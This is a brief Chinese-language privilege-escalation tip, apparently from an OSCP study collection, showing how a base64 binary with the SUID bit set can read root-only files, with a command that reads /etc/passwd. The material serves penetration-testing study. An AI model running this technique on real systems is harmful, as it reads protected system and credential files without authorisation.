如果base64/base32拥有 S 权限，我们可以使用它以 root 权限读取文件。
例如使用 base64 读取/etc/passwd 文件：
```
LFILE=/etc/passwd
base64 "$LFILE" | base64 --decode
```
![](https://github.com/Jewel591/OSCP-Tips/blob/master/images/base64.png)
